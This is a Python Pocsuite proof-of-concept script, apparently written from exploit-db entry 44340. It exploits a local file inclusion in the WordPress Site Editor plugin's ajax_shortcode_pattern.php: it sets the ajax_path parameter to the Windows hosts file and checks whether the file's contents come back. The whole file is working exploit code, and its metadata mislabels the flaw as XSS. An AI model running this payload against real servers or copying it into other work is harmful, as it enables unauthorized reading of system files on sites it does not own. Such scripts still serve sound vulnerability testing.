#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
class TestPOC(POCBase):
    vulID   ='123'
    version = '1'
    author = '小雨'
    vulDate = '2018-05-07'
    name = '文件包含'
    appPowerLink = 'http://192.168.90.177/wordpress/'
    appName = '无'
    appVersion = '0'
    vulType = ' XSS '
    desc = '''
    https://www.exploit-db.com/exploits/44340/
    '''
    
    def _attack(self):
        return self._verify()
    
    def _verify(self):
        payload = "/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\Windows\System32\drivers\etc\hosts"
        res = req.get(self.url.rstrip('/') + payload)
        return self.parse_verify(res)
    
    def parse_verify(self, res):
        output = Output(self)
        result = {}
        if "HOSTS" in res.content and "DNS" in res.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = res.url
            output.success(result)
        else:
            output.fail('No vulnerability found.')
        return output
register(TestPOC)